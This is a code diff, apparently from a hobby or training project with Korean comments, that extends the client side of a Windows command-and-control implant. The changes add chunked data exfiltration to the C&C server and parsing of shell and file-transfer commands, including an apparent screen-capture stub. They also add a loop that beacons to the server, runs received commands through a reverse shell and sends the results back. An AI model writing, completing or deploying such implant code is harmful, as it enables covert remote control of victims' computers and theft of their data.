@@ -93,23 +93,60 @@ void cncManager::sendHttpRequest(LPVOID data, DWORD dlen) {
 /* C&C에 데이터 보내는 함수. sendHttpRequest를 Wrapping함. */
 void cncManager::sendData(UCHAR DDtype, ULONG64 dlen, LPVOID data) {
     if (dlen <= 0xffff) {
-        DDprotocol* ftpFrame = new DDprotocol;
-        ftpFrame->type = DDtype;
-        ftpFrame->len = dlen;
-        ftpFrame->seq = 0;
+        DDprotocol* dataFrame = new DDprotocol;
+        dataFrame->type = DDtype;
+        dataFrame->len = dlen;
+        dataFrame->seq = 0;
 
         UCHAR* stream = new UCHAR[sizeof(DDprotocol) + dlen];
         memset(stream, 0, sizeof(DDprotocol) + dlen);
-        memcpy(stream, ftpFrame, sizeof(DDprotocol));
+        memcpy(stream, dataFrame, sizeof(DDprotocol));
         memcpy(stream + sizeof(DDprotocol), data, dlen);
 
         this->sendHttpRequest((LPVOID)stream, sizeof(DDprotocol) + dlen);
-        delete ftpFrame;
+        delete dataFrame;
         delete[] stream;
         
     }
-    /* 이쪽 seq로 잘라서 데이터 보내는거 구현해야함. */
-    //else
+    else {
+        DWORD seq = 1;
+        ULONG64 left_offset = dlen, sended_offset = 0;
+    
+        while(left_offset > MAX_DATA_LEN){
+            DDprotocol* dataFrame = new DDprotocol;
+            dataFrame->type = DDtype;
+            dataFrame->len = MAX_DATA_LEN;
+            dataFrame->seq = seq;
+
+            UCHAR* stream = new UCHAR[MAX_DATA_LEN + sizeof(DDprotocol)];
+            memset(stream, 0, sizeof(DDprotocol) + MAX_DATA_LEN);
+            memcpy(stream, dataFrame, sizeof(DDprotocol));
+            memcpy(stream + sizeof(DDprotocol), (UCHAR *)data + sended_offset, MAX_DATA_LEN);
+            this->sendHttpRequest((LPVOID)stream, MAX_DATA_LEN);
+            seq++;
+            left_offset -= MAX_DATA_LEN;
+            sended_offset += MAX_DATA_LEN;
+            delete[] stream;
+            delete dataFrame;
+        }
+        if (left_offset) {
+            DDprotocol* dataFrame = new DDprotocol;
+            dataFrame->type = DDtype;
+            dataFrame->len = left_offset;
+            dataFrame->seq = 0;
+
+            UCHAR* stream = new UCHAR[sizeof(DDprotocol) + left_offset];
+            memset(stream, 0, sizeof(DDprotocol) + left_offset);
+            memcpy(stream, dataFrame, sizeof(DDprotocol));
+            memcpy(stream + sizeof(DDprotocol), (UCHAR*)data + sended_offset, left_offset);
+
+            this->sendHttpRequest((LPVOID)stream, sizeof(DDprotocol) + left_offset);
+            delete dataFrame;
+            delete[] stream;
+        }
+    }
+
+
 }
 /* C&C에 beacon 보내는 함수. sendHttpRequest를 Wrapping함.*/
 /* 이 함수는 별도 스레드로 돌려야할듯. */
@@ -137,9 +174,6 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
         resData->len = *(USHORT *)(res+2);
         resData->seq = *(DWORD *)(res+4);
         ///* For DEBUG */
-        //printf("-------------------\n");
-        //printf("header : 0x%x\ntype   : 0x%x\nlen    : 0x%x\nseq    : 0x%x\n", resData->header, resData->type, resData->len, resData->seq);
-        //printf("-------------------\n");
 
         if (resData->header != DDPROTO_HEADER)
             std::cout << "Invalid Header !!!" << std::endl;
@@ -150,16 +184,22 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
             switch (resData->type)
             {
             case error:
-                std::cout << "error request !!!" << std::endl;
+            {
+                this->printParsedResponse(resData, "ERROR");
                 break;
+            }
+                
 
             case beaconResponse:
-                std::cout << "beaconResponse !!!" << std::endl;
+            {
+                this->printParsedResponse(resData, "BEACON_RESPONSE");
                 break;
+            }
+                
 
             case shellRequest:
             {
-                std::cout << "shellRequest !!!" << std::endl;
+                this->printParsedResponse(resData, "SEHLL_REQUEST");
                 std::istringstream spliter(data);
                 std::string tmp;
                 while (std::getline(spliter, tmp, ';')) {
@@ -168,17 +208,29 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
                 break;
             }
 
-            case ftpReqeust:
-                std::cout << "ftpReqeust !!!" << std::endl;
+            case ftpRequest:
+            {
+                this->printParsedResponse(resData, "FTP_REQUEST");
+                if (!data.compare("screen")) {
+                    
+                }
                 break;
 
+            }
+            
             case none:
-                //std::cout << "none !!!" << std::endl;
+            {
+                this->printParsedResponse(resData, "NONE");
                 break;
+            }
+                
 
             default:
-                std::cout << "Invalid type !!!" << std::endl;
+            {
+                this->printParsedResponse(resData, "TYPE_ERROR");
                 break;
+            }
+                
             }
 
             delete resData;
@@ -187,16 +239,25 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
 
 }
 
+void cncManager::printParsedResponse(DDprotocol* resData,std::string type) {
+    std::cout << "==parsed data==" << std::endl;
+    std::cout << "header : " << resData->header << std::endl;
+    std::cout << "type :" << type << std::endl;
+    std::cout << "length :" << resData->len << std::endl;
+    std::cout << "sequence :" << resData->seq << std::endl;
+    std::cout << "===============" << std::endl;
+}
+
 void cncManager:: handleShellRequest(commandManager& commander) {
     std::string result;
     while (TRUE) {
         /* For DEBUG */
-        this->sendData(1, 0, NULL);
+        this->sendData(beaconRequest, BEACON_DATA_LEN, BEACON_DATA);
 
         while (!this->shellCmd.empty()) {
             result = commander.reverseShell(this->shellCmd.front());
             /* For DEBUG */
-            std::cout << result;
+            //std::cout << result;
             this->sendData(shellResponse, result.size(), (LPVOID)result.c_str());
             this->shellCmd.pop_front();
         }
